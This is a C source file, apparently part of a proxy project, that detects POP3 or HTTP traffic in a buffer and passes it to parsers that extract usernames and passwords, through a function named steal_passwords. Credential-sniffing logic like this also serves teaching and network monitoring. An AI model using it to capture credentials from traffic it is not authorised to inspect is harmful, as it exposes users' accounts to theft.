#include <stdlib.h>
#include <stdio.h>
#include "login_parser.h"


bool identify_pop3_protocol(const char * buf, size_t size) {
	return 	(size >= 3 && buf[0] == '+' && buf[1] == 'O' && buf[2] == 'K') ||
			  (size >= 4 && buf[0] == '-' && buf[1] == 'E' && buf[2] == 'R' && buf[3] == 'R');
}

bool identify_http_protocol(const char * buf) {
	char http_define[16] = {0};
	int m = sscanf(buf, "%*s %*s %s", http_define);
	return m == 1 && http_define[0] == 'H' && http_define[1] == 'T' && http_define[2] == 'T' && http_define[3] == 'P';
}

enum protocols identify_protocol(const char * buf, size_t size){
	if(identify_pop3_protocol(buf, size))
		return PROTOCOL_POP3;
	else if(identify_http_protocol(buf))
		return PROTOCOL_HTTP;

	return PROTOCOL_UNKNOWN;
}

void steal_passwords(const char * buf, size_t size, login_data * data, login_state * state, communication_actor actor){
	if(data->valid == true)
		return;

	if(state->protocol == PROTOCOL_UNIDENTIFIED) {
		state->protocol = identify_protocol(buf, size);

		switch (state->protocol) {
			case PROTOCOL_HTTP:
				http_login_init_state(&state->parse_state.http);
				break;
			case PROTOCOL_POP3:
				pop3_login_init_state(&state->parse_state.pop3);
				break;
			default:
				break;
		}

		data->user = NULL;
		data->pass = NULL;
		data->valid = false;
	}
	switch (state->protocol) {
		case PROTOCOL_HTTP:
			state->finished = http_login_consume_buffer(buf, size, data, &state->parse_state.http, actor);
			break;
		case PROTOCOL_POP3:
			state->finished = pop3_login_parser_consume_buffer(buf, size, data, &state->parse_state.pop3, actor);
			break;
		default:
			break;
	}
}

const char * get_protocol_name(login_state * state){
	switch (state->protocol) {
		case PROTOCOL_HTTP:
			return "HTTP";
		case PROTOCOL_POP3:
			return "POP3";
		default:
			return NULL;
	}
}

void free_login_state(login_state * state){
	switch (state->protocol) {
		case PROTOCOL_HTTP:
			http_free_login_state(&state->parse_state.http);
			break;
		case PROTOCOL_POP3:
		default:
			break;
	}
}


void free_login_data(login_data *login) {
	if(login != NULL){
		if(login->user != NULL)
			free(login->user);
		if(login->pass != NULL)
			free(login->pass);
	}
}